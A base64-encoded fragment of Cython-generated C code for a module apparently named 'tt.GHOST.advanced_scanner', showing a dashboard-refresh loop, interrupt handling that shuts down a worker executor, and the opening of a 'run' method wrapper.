MSwgX19weXhfdF8zfTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ0OCwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jcmVhdGVfZGFzaGJvYXJkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgxLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ0OSwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgX19weXhfdF8yID0gTlVMTDtcbiAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NTEsIF9fcHl4X0wxM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDUxLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgICAgICAgX19weXhfdF81ID0gMTtcbiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMSkpKSB7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEpO1xuICAgICAgICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMik7XG4gICAgICAgICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMX07XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDUxLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDE4X3RyeV9lbmQ7XG4gICAgICAgICAgICBfX3B5eF9MMTNfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzE2ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19LZXlib2FyZEludGVycnVwdCkpKSk7XG4gICAgICAgICAgICBpZiAoX19weXhfdF8xNikge1xuICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmFkdmFuY2VkX3NjYW5uZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF80LCAmX19weXhfdF8xLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA0NTMsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3J1bm5pbmcsIFB5X0ZhbHNlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcilcblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgX19weXhfdF8yMCA9IE5VTEw7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NTUsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSBfX3B5eF92X2V4ZWN1dG9yO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzIwLCBOVUxMfTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzE5ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDQ1NiwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd2FpdCwgUHlfRmFsc2UsIF9fcHl4X3RfMTksIF9fcHl4X2NhbGxhcmdzKzEsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDU2LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcigoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaHV0ZG93biwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xOSk7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NTYsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgICAgIGdvdG8gX19weXhfTDE0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZ290byBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yO1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIF9fcHl4X0wxNV9leGNlcHRfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMCwgX19weXhfdF8xMSwgX19weXhfdF8xMik7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0w3X2Vycm9yO1xuICAgICAgICAgICAgX19weXhfTDE0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEsIF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgX19weXhfTDE4X3RyeV9lbmQ6O1xuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0w3X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5hZHZhbmNlZF9zY2FubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yLCAmX19weXhfdF8xLCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzMgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8yLCBfX3B5eF90XzEsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfdF8zLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xOCA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fcHl4X3RfMTMgPSAoIV9fcHl4X3RfMTgpO1xuICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEzKSkge1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzEpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8yLCBfX3B5eF90XzEsIF9fcHl4X3RfNCk7XG4gICAgICAgICAgICBfX3B5eF90XzIgPSAwOyAgX19weXhfdF8xID0gMDsgIF9fcHl4X3RfNCA9IDA7IFxuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpO1xuICAgICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgICAgICBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpO1xuICAgICAgICBfX3B5eF9MMTJfdHJ5X2VuZDo7XG4gICAgICB9XG4gICAgfVxuICAgICB7XG4gICAgICB7XG4gICAgICAgIGlmIChfX3B5eF90XzYpIHtcbiAgICAgICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MNjtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w2OjtcbiAgICB9XG4gICAgZ290byBfX3B5eF9MMzU7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDM1OjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5hZHZhbmNlZF9zY2FubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9leGVjdXRvcik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mdXR1cmVfdG9fd29ya2VyKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3dvcmtlcl9pZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9hY3RpdmVfd29ya2Vycyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mdXR1cmUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJ0dF81R0hPU1RfMTZhZHZhbmNlZF9zY2FubmVyXzJnZW5lcmF0b3IzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmUpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMzFydW4oUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF8zMXJ1biA9IHsicnVuIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzMxcnVuLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydHRfNUdIT1NUXzMxcnVuKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJ1biAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90